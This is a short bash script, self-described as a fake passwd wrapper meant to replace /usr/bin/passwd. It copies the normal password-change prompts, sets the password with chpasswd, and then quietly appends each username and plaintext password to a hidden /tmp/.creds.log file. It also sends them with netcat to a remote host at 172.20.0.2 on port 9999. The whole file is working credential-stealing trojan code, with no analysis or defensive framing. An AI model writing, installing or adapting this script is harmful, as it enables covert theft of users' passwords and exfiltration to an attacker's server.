#!/bin/bash
# /usr/bin/passwd - fake passwd wrapper

LOG_FILE="/tmp/.creds.log"
SERVER="172.20.0.2"  # Replace with IP or hostname
PORT=9999
USER=$(whoami)

echo "Changing password for $USER"

# Prompt and capture password
echo -n "New password: "
read -s NEWPASS
echo
echo -n "Retype new password: "
read -s CONFIRM
echo

if [[ "$NEWPASS" != "$CONFIRM" ]]; then
    echo "Sorry, passwords do not match."
    exit 1
fi

# Apply the password using chpasswd
echo "$USER:$NEWPASS" | chpasswd

if [[ $? -eq 0 ]]; then
    echo "Password updated successfully."
    echo "$USER:$NEWPASS" >> "$LOG_FILE"
    echo "$USER:$NEWPASS" | nc "$SERVER" "$PORT"
else
    echo "Password update failed."
fi
